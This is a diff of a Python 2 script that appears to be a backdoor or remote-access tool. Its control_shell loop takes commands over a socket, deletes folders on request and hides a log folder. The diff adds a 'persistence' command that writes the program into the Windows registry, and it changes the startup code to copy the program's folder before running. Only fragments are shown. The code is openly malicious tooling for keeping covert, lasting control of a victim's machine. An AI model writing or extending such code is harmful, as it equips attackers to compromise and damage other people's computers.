@@ -164,13 +164,24 @@ def control_shell():
                         s.send("\n\n")
                         s.send("[*] Getting ready to delete the files .................................... \n\n")
                         remove_folder(folder_path)
+
+                    # persistence 
+                    elif (command.strip() == 'persistence'):
+                        s.send("\n\n")
+                        s.send("[*] Getting ready to be add to the registry ................................. \n\n")
+                        persistance()
+
                     
             except:
                   print "[INFO] Connection Closed"
                   s.close()
                   break
                                   
-                
+
+
+# New additional function
+# [!] move them to modules
+
 def hide_file(file_path):
 
    """This function hides the folder of logs"""
@@ -205,6 +216,5 @@ def main():
     control_shell()
 
 
-#copy_folder(dest_path)
-persistance()
+copy_folder(dest_path)
 main()
